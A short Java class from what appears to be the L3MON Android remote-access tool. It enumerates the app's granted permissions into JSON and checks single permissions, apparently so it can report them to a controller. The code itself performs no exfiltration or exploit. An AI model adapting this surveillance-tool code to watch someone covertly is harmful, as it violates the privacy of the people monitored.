package com.etechd.l3mon;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import static com.etechd.l3mon.ConnectionManager.context;

public class PermissionManager {

    public static JSONObject getGrantedPermissions() {
        JSONObject data = new JSONObject();
        try {
            JSONArray perms = new JSONArray();
            PackageInfo pi = context.getPackageManager().getPackageInfo(context.getPackageName(), PackageManager.GET_PERMISSIONS);
            for (int i = 0; i < pi.requestedPermissions.length; i++) {
                if ((pi.requestedPermissionsFlags[i] & PackageInfo.REQUESTED_PERMISSION_GRANTED) != 0) perms.put(pi.requestedPermissions[i]);
            }
            data.put("permissions", perms);
        } catch (Exception e) {
        }
        return data;
    }

    public static boolean canIUse(String perm) {
        if(context.getPackageManager().checkPermission(perm, context.getPackageName()) == PackageManager.PERMISSION_GRANTED) return true;
        else return false;
    }

}
